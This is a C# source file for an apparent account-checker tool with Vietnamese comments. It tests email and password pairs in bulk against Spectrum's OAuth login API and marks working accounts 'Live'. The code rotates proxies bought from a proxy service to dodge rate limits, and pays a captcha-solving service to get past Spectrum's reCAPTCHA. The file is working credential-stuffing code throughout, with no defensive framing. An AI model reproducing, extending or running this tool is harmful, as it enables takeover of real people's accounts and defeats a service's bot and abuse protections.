using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Text.Json.Nodes;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using RestSharp;
using ToolMail.Models;

namespace ToolMail.Controllers
{
    public class ProcessMail
    {
        public int _numThread = 1;
        public int _numThreadPerProxy = 100;
        public static string _apiGetProxyUrl = "http://proxy.shoplike.vn/Api/getCurrentProxy";
        public static string _apiRefreshProxy = "http://proxy.shoplike.vn/Api/getNewProxy";
        private readonly HttpClient _httpClient = new();
        public ConcurrentDictionary<string, ProxyInfo> _apiKeys = new();
        public class ProxyInfo // Changed from private to public
        {
            public string Proxy { get; set; } = string.Empty;
            public int CurrentUsage { get; set; } = 0;
            public int MaxUsage { get; set; }
            public SemaphoreSlim Semaphore { get; } = new SemaphoreSlim(1, 1); // Đảm bảo chỉ 1 luồng refresh proxy
        }
        public void setApikey(List<string> shopLikeKey)
        {
            _apiKeys.Clear();
            foreach (var kvp in shopLikeKey)
            {
                _apiKeys[kvp] = new ProxyInfo
                {
                    Proxy = string.Empty,
                    MaxUsage = _numThreadPerProxy
                };
            }
        }
        private async Task<string?> CallApiAsync(string url)
        {
            try
            {
                return await _httpClient.GetStringAsync(url);
            }
            catch (Exception ex)
            {
                // Log lỗi nếu cần
                Console.WriteLine($"Error calling API: {ex.Message}");
                return null;
            }
        }

        public async Task<string?> GetProxyAsync(string apiKey)
        {
            var response = await CallApiAsync($"{_apiGetProxyUrl}?access_token={apiKey}");
            if (string.IsNullOrEmpty(response)) return null;

            var jsonResponse = JsonObject.Parse(response);
            if (jsonResponse?["status"]?.ToString() == "error")
                return null;

            return jsonResponse?["data"]?["proxy"]?.ToString();
        }

        public async Task<string?> RefreshProxyAsync(string apiKey)
        {
            try
            {
                for (int i = 1; i <= 3; i++)
                {
                    var response = await CallApiAsync($"{_apiRefreshProxy}?access_token={apiKey}");
                    if (string.IsNullOrEmpty(response)) return null;

                    var jsonResponse = JsonObject.Parse(response);
                    if (jsonResponse?["status"]?.ToString() == "error")
                    {
                        int nextChange = jsonResponse?["nextChange"]?.GetValue<int>() ?? -10;
                        if (nextChange != -10)
                        {
                            await Task.Delay((nextChange + 10) * 1000);
                        }
                    }

                    return jsonResponse?["data"]?["proxy"]?.ToString();
                }

                return string.Empty;
            }
            catch
            {
                return await GetProxyAsync(apiKey);
            }
        }

        public async Task<string?> GetAvailableProxyAsync(string apiKey)
        {
            try
            {
                if (apiKey == null) return null;
                if (!_apiKeys.TryGetValue(apiKey, out var proxyInfo))
                {
                    return null;
                }

                // Đảm bảo chỉ 1 luồng refresh proxy tại một thời điểm
                if (proxyInfo.Proxy == string.Empty)
                {
                    try
                    {
                        await proxyInfo.Semaphore.WaitAsync();
                        // Nếu proxy đã hết hoặc proxy đạt giới hạn, tiến hành refresh proxy
                        proxyInfo.Proxy = await GetProxyAsync(apiKey) ?? string.Empty;
                    }
                    finally
                    {
                        proxyInfo.Semaphore.Release();
                    }
                }

                if (proxyInfo.CurrentUsage >= proxyInfo.MaxUsage)
                {
                    try
                    {
                        await proxyInfo.Semaphore.WaitAsync();
                        // Nếu proxy đã hết hoặc proxy đạt giới hạn, tiến hành refresh proxy
                        proxyInfo.Proxy = await RefreshProxyAsync(apiKey) ?? string.Empty;
                        proxyInfo.CurrentUsage = 0; // Reset usage sau khi refresh
                    }
                    finally
                    {
                        proxyInfo.Semaphore.Release();
                    }
                }

                // Sử dụng proxy và tăng số luồng đã sử dụng
                int currentUsage = proxyInfo.CurrentUsage;
                Interlocked.Increment(ref currentUsage);
                proxyInfo.CurrentUsage = currentUsage; // Gán lại giá trị đã tăng

                return proxyInfo.Proxy;
            }
            catch (Exception err)
            {
                return null;
            }
        }

        public async Task MainFunc(InputMail input, string proxy)
        {
            string email = input.Email;
            string password = input.Password;
            try
            {
                string captchaResponse = "";
                bool hasCaptcha = !string.IsNullOrEmpty(proxy);
              
                for (int attempt = 0; attempt < 3; attempt++)
                {
                    input.Status = $"Đang giải captcha({attempt + 1})";
                    // log status: giai captcha
                    captchaResponse = await GetResponseCaptchaOmo2Async();
                    if (!string.IsNullOrEmpty(captchaResponse))
                    {
                        break;
                    }
                }

                if (!string.IsNullOrEmpty(captchaResponse))
                {
                    input.Status = $"Đang check mail live";
                    string data = $"client_id=client&client_secret=test&grant_type=password&scope=client&username={WebUtility.UrlEncode(email)}&password={password}&recaptcha={captchaResponse}";
                    var clientOptions = new RestClientOptions("https://self-care-api.portals.spectrum.net")
                    {
                        Proxy = !string.IsNullOrEmpty(proxy) ? new WebProxy(proxy) : null
                    };
                    var client = new RestClient(clientOptions);
                    var request = new RestRequest("oauth/auth", Method.Post);
                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                    request.AddParameter("application/x-www-form-urlencoded", data, ParameterType.RequestBody);

                    var response = await client.ExecuteAsync(request);

                    if (response.Content.Contains("access_token"))
                    {
                        input.Status = "Live";
                            // log mail live
                            // log all sum live
                        }
                    else
                    {
                        JObject jsonResponse = JObject.Parse(response.Content);
                        input.Status = jsonResponse["title"].ToString();
                    }
                }
                else
                {
                    input.Status = "Lỗi giải captcha!";
                }
            }
            catch (Exception ex)
            {
                //Common.SetStatusDataGridView(this.dtgvAcc, indexRow, "cStatusAcc", "Lỗi không xác định!");
                input.Status = "Lỗi không xác định!";
            }
        }
        public string _captchaKey { set; get; } = "";
        private async Task<string> GetResponseCaptchaOmo2Async()
        {
            string result = "";
            try
            {
                var client = new RestClient("https://autocaptcha.pro/apiv3/process");
                var request = new RestRequest("", Method.Post);
                request.AddHeader("Content-Type", "application/json");
                request.AddJsonBody(new
                {
                    key = _captchaKey,
                    type = "recaptchav2",
                    googlesitekey = "6LfRsggUAAAAABJBT04IBvG0gWCNSB_FuhkC4PAx",
                    pageurl = "https://self-care.portals.spectrum.net/login"

                });

                var response = await client.ExecuteAsync(request);
                if (response.IsSuccessful)
                {
                    var JsonRes = JObject.Parse(response.Content);
                    return JsonRes?["captcha"].ToString();
                }
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error solving captcha: {ex.Message}");
            }
            return result;
        }

        public async Task ProcessEmailsAsync(ObservableCollection<InputMail> emailsToProcess, int numberLimitThread)
        {
            int apiKeyIndex = 0;
            var semaphore = new SemaphoreSlim(numberLimitThread);
            var tasks = emailsToProcess.Select(async email =>
            {
                await semaphore.WaitAsync();
                try
                {
                    string apiKey = _apiKeys.Keys.ElementAt(apiKeyIndex);
                    string? ip = await GetAvailableProxyAsync(apiKey);// Lấy proxy cho user
                    email.Proxy = ip;
                    email.Status = "Đang chạy";
                    await MainFunc(email, ip);
                }
                catch(Exception err)
                {

                }
                finally
                {
                    apiKeyIndex = (apiKeyIndex + 1) % _apiKeys.Count;
                    semaphore.Release();
                }
            }).ToArray();

            await Task.WhenAll(tasks);
        }

    }
}
